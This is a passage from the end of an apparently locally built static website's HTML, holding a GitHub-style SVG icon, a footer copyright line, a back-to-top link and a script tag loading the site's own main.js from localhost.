    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        © 2024 .
        
    </small>
</footer><a href="#" title="" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script async src="http://localhost:1313/js/main.js" ></script>

    

</body>
</html>
